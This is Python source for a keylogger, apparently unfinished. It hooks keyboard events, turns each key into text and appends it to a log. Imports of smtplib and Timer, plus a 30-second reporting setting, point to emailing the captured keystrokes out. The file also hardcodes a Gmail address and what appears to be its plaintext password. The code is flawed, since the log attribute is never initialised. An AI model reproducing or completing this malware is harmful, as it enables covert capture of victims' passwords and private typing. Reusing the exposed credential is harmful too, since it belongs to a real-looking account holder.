import keyboard
import smtplib
from threading import Timer



send_report_evry = 30
emailaddress = "shreeshavoniyadka@gmail.com"
emailpassword="shreesha0210"
class Keylogger():

  def __init__(self) -> None:
      pass
  def callback(self, event):
          """
          This callback is invoked whenever a keyboard event is occured
          (i.e when a key is released in this example)
          """
          name = event.name
          if len(name) > 1:
              # not a character, special key (e.g ctrl, alt, etc.)
              # uppercase with []
              if name == "space":
                  # " " instead of "space"
                  name = " "
              elif name == "enter":
                  # add a new line whenever an ENTER is pressed
                  name = "[ENTER]\n"
              elif name == "decimal":
                  name = "."
              else:
                  # replace spaces with underscores
                  name = name.replace(" ", "_")
                  name = f"[{name.upper()}]"
          # finally, add the key name to our global `self.log` variable
          self.log += name